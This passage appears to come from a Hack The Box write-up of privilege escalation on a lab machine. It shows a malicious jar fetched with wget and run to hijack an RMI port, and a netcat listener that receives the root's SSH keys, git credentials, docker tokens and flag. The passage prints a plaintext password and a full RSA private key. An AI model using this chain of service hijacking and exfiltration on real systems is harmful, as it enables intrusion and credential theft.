adding: com/htb/hosting/rmi/AbstractFile.class(in = 2355) (out= 956)(deflated 59%)
adding: com/htb/hosting/rmi/FileService.class(in = 989) (out= 388)(deflated 60%)
adding: com/htb/hosting/rmi/FileServiceConstants.class(in = 504) (out= 327)(deflated 35%)
adding: com/htb/hosting/rmi/FileServiceImpl.class(in = 8723) (out= 4076)(deflated 53%)
adding: com/htb/hosting/rmi/Server.class(in = 1802) (out= 881)(deflated 51%)
adding: com/htb/hosting/rmi/quarantine/(in = 0) (out= 0)(stored 0%)
adding: com/htb/hosting/rmi/quarantine/QuarantineConfiguration.class(in = 2812) (out= 1269)(deflated 54%)
adding: com/htb/hosting/rmi/quarantine/QuarantineService.class(in = 310) (out= 196)(deflated 36%)
adding: com/htb/hosting/rmi/quarantine/QuarantineServiceImpl.class(in = 1191) (out= 616)(deflated 48%)
adding: com/htb/hosting/rmi/quarantine/QuarantineServiceImpl.java(in = 697) (out= 340)(deflated 51%)
adding: com/htb/hosting/rmi/utils/(in = 0) (out= 0)(stored 0%)
adding: com/htb/hosting/rmi/utils/CryptUtil.class(in = 3280) (out= 1667)(deflated 49%)
adding: com/htb/hosting/rmi/utils/FileUtil.class(in = 2660) (out= 1357)(deflated 48%)
adding: com/htb/hosting/rmi/utils/StringUtil.class(in = 1377) (out= 696)(deflated 49%)
adding: registry.jar.orig(in = 15343) (out= 13437)(deflated 12%)
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two/exploitation/privesc/registry]
╰─ $ ls -la 
total 64
drwxr-xr-x 4 th3g3ntl3m4n th3g3ntl3m4n  4096 Aug 25 17:01 .
drwxr-xr-x 3 th3g3ntl3m4n th3g3ntl3m4n  4096 Aug 25 16:55 ..
drwxr-xr-x 3 th3g3ntl3m4n th3g3ntl3m4n  4096 Feb  2  2023 com
drwxr-xr-x 2 th3g3ntl3m4n th3g3ntl3m4n  4096 Feb  2  2023 META-INF
-rw-r--r-- 1 th3g3ntl3m4n th3g3ntl3m4n 29600 Aug 25 17:01 registry.jar
```

We upload our malicious jar to the host.

```bash
developer@registry:/tmp/.th3g3ntl3m4n$ wget http://10.10.14.217/registry.jar
--2023-08-25 21:05:03--  http://10.10.14.217/registry.jar
Connecting to 10.10.14.217:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 29600 (29K) [application/java-archive]
Saving to: ‘registry.jar’

registry.jar                  100%[===============================================>]  28.91K   178KB/s    in 0.2s    

2023-08-25 21:05:04 (178 KB/s) - ‘registry.jar’ saved [29600/29600]
```

Now we execute our malicious jar file and open our listener on port 3310.

```bash
# Executing our malicious jar
developer@registry:/tmp/.th3g3ntl3m4n$ while true;do java -jar registry.jar;done
...
Exception in thread "main" java.rmi.server.ExportException: Port already in use: 9002; nested exception is: 
        java.net.BindException: Address already in use                                                                
        at java.rmi/sun.rmi.transport.tcp.TCPTransport.listen(TCPTransport.java:346)
        at java.rmi/sun.rmi.transport.tcp.TCPTransport.exportObject(TCPTransport.java:243)   
        at java.rmi/sun.rmi.transport.tcp.TCPEndpoint.exportObject(TCPEndpoint.java:415)
        at java.rmi/sun.rmi.transport.LiveRef.exportObject(LiveRef.java:147)                 
        at java.rmi/sun.rmi.server.UnicastServerRef.exportObject(UnicastServerRef.java:235)
        at java.rmi/sun.rmi.registry.RegistryImpl.setup(RegistryImpl.java:223)               
        at java.rmi/sun.rmi.registry.RegistryImpl.<init>(RegistryImpl.java:208)
        at java.rmi/java.rmi.registry.LocateRegistry.createRegistry(LocateRegistry.java:203) 
        at com.htb.hosting.rmi.Server.main(Server.java:15)
Caused by: java.net.BindException: Address already in use                                                             
        at java.base/sun.nio.ch.Net.bind0(Native Method)
        at java.base/sun.nio.ch.Net.bind(Net.java:555)                                                                
        at java.base/sun.nio.ch.Net.bind(Net.java:544)
        at java.base/sun.nio.ch.NioSocketImpl.bind(NioSocketImpl.java:643)                    
        at java.base/java.net.ServerSocket.bind(ServerSocket.java:388)
        at java.base/java.net.ServerSocket.<init>(ServerSocket.java:274)                      
        at java.base/java.net.ServerSocket.<init>(ServerSocket.java:167)
        at java.rmi/sun.rmi.transport.tcp.TCPDirectSocketFactory.createServerSocket(TCPDirectSocketFactory.java:45)
        at java.rmi/sun.rmi.transport.tcp.TCPEndpoint.newServerSocket(TCPEndpoint.java:673)
        at java.rmi/sun.rmi.transport.tcp.TCPTransport.listen(TCPTransport.java:335)
        ... 8 more                                         
[+] Bound to 9002                                          
Aug 25, 2023 9:40:02 PM com.htb.hosting.rmi.quarantine.QuarantineServiceImpl getConfiguration
INFO: client fetching configuration
```

```bash
# On netcat listener
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two/exploitation/privesc/registry]
╰─[☢ ⚙] $ while true;do nc -vnlp 3310; done
listening on [any] 3310 ...
...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 37720
zSCAN /root/.ssh/id_rsalistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 33228
zSCAN /root/.ssh/authorized_keyslistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 33254
zSCAN /root/.ssh/id_rsalistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 33264
zSCAN /root/.ssh/authorized_keyslistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 42114
zSCAN /root/.docker/.token_seed.locklistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 42104
zSCAN /root/.ssh/id_rsa.publistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 42150
zSCAN /root/.git-credentialslistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 42176
zSCAN /root/check-vhosts.shlistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 55842
zSCAN /root/.ssh/authorized_keyslistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 55848
zSCAN /root/.ssh/id_rsa.publistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 57194
zSCAN /root/docker-registry/docker-compose.ymllistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 57214
zSCAN /root/nginx/defaultlistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 57242
zSCAN /root/.ssh/id_rsalistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 57230
zSCAN /root/.git-credentialslistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 45464
zSCAN /root/tomcat-app/context.xmllistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 45466
zSCAN /root/tomcat-app/Dockerfilelistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 45486
zSCAN /root/.ssh/authorized_keyslistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 45492
zSCAN /root/.ssh/id_rsa.publistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 46274
zSCAN /root/.docker/config.jsonlistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 46288
zSCAN /root/.docker/.token_seedlistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 46298
zSCAN /root/.lesshstlistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 48830
zSCAN /root/.lesshstlistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 41948
zSCAN /root/.ssh/id_rsa.publistening on [any] 3310 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.11.223] 41960
zSCAN /root/root.txtlistening on [any] 3310 ...
...
```

We catch the root `id_rsa` private SSH key, but we haven’t access to it. Then we check the `.git-credentials` file and get a credential.

![Untitled](images/Untitled%2037.png)

```bash
developer@registry:/tmp/.th3g3ntl3m4n$ cat quarantine-run-2023-08-25T22:01:45.174158289/_root_.git-credentials
https://admin:52nWqz3tejiImlbsihtV@github.com
```

We tried to log into SSH service but we weren’t successful. Then we ran `su root` and we logged as user root.

```bash
developer@registry:/tmp/.th3g3ntl3m4n$ su root
Password: 
root@registry:/tmp/.th3g3ntl3m4n# id
uid=0(root) gid=0(root) groups=0(root)
```

We retrieved the root private SSH key.

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAu6cKIYTq4SLhb2Ctt06oqYgxel5Alo3fIg4+bECeIVV8TK02
xbPaDLBpgVfo2jEHV+sSA6BaKQ7EsVReFaWEmI7GN+qcihaeaD5k65jblOYbwiV+
xW3MvWb1aGFo80EeFhHzAj9yOT5kilAFH5MqwALDfOd7bzOvFgxF0+26w1dzm9Lr
gvFo+N2Fpo0QV8lx8Z/nRPwlK90TaQ3VbF0dMJ4wzdkYv7JzcUX8nw2afq6WfYm8
8T//mV6Sed8OEHGFlvYj8HBltIwWyEFjDvWf0Filn5rv/hvEyuj9eFaFvOZUrofm
LTD84kJ2HiAePAJbXeEyjT8oGZFJJdUH0kubZQIDAQABAoIBAQCuu7b6SUtxAkrK
rEp18x+oZTI1UMhxqH+KtZq4sF7OiUxqFax34aX7xNUpZJNlgNvmqPQoPktWCfNr
cDT/kRVr/R5j+Ol0x+UPCnJs0vQ8rRxR5xoperl38AQ6AuJ4CD2crXALusqAtTFn
fWWX5jCbhLdFekL85DJ3pEvtMGOE+jRAIuZz6rqFQ3SvDlWMTrEJy+MG2qJvZ58Q
VnsvfBYsFVOycc31kqHiGqYeO2YD/aHN8K6+uJ9UG0dFYvwF/nGu0ZcxhJDunpNK
+ZsaQ3xAyDGzVrllXFlc2zUf7DOxiF5HCA6IC+j5ei15iQcjvhxA4lzf9pOC+rFL
ixFUCsgNAoGBAOI78IJYNmMxxeHv1dqD25LMJ9LKGQZ5w+wo5FioGaJg1BeJA4ZI
g7u3QyY0odLGxchOJukcrrVsMxtS9Bhhrf+yQz+QrWgc9jEVsGEnVAzoHMqUR70j
OoGSQhFsnuy+xVkbY5bU5rVrXImESR+doKBBjwU/CIFMx8VQaDOp0zVvAoGBANRX
lgi8t0MTOj+dWTGL110xCPWW0JKVHE1C//I+Xt27uhMg3Co8Jd9plQ/TJrmlj9r+
hlogoCXzFU9fSgeAzSXQajFRfthYC8CD0ViKYMNap6GxL2mGHvjjojx/OaYD3Pc7
NG3RI064XV1RUZc4opgS8U2Ef8XMdpqS5SIwWRprAoGBAIjeXH5vIdBXT3GGaOn/
dfrU2o7zR7qcNkUM5EEiygdr70Sh1ukJu/D4SX62vuRG72dkqLPFb4lBAZZZVGXf
yqX0Ui0FuXNQej1t8ryET5xTXP/OP6yUwJOdSa1C+s8eB0UGhfS9ryo43s4voxGm
ioQJxZ4V6W5YZk/genovFyGvAoGAVED8kzLuNHsonZ09it9F8QBH4cqZr8/ijvWK
wP/mfGzEhFqBgXCkRmWKc+EAeKEs12Quwww2/1fYmMnigd+lht+Pg0om3ojxAM5M
/qjJhDowUYQQn/pLx83qzb5djXXy81ZWk0xsigu1YBWoHiymt1iszmlImZ9rYCHx
MQOmF0kCgYB1h9FWUaE9l6dMKZL18Q6EppBMXwldWljobWTnWewM62zqvrj80u5n
LrXPssLnDZeEZaLfV73DUMOwn7i81TBDhw3hUWhn2FYWvyRbZ0cHO5S1QnjQhTSM
mRLe83KmTu/GbuAfCg5gEqpDAGxvOEjZm/aZBtputCel1pFyNH8F3w==
-----END RSA PRIVATE KEY-----
```

But we couldn’t log in using the private key too.

![Untitled](images/Untitled%2038.png)